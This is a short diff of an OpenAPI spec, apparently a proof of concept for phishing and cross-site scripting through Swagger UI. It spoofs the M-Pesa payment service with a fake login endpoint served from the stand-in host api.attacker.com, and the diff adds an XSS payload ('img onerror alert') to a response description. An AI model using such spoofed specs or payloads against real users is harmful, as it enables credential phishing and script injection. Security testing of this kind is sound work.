@@ -1,22 +1,22 @@
 {
   "openapi": "3.0.0",
   "info": {
-    "title": "Fake M-Pesa API",
-    "version": "1.0.0",
-    "description": "This is a spoofed API hosted under m-pesa.com"
+    "title": "M-Pesa Spoofed API",
+    "description": "Phishing via Swagger UI",
+    "version": "1.0.0"
   },
   "servers": [
     {
-      "url": "https://api.attacker.com/" 
+      "url": "https://api.attacker.com/"
     }
   ],
   "paths": {
     "/login": {
       "get": {
-        "summary": "Fake Login Endpoint",
+        "summary": "Fake login endpoint",
         "responses": {
           "200": {
-            "description": "Successful login (not really)"
+            "description": "<img src=x onerror=alert('Swagger XSS')>"
           }
         }
       }
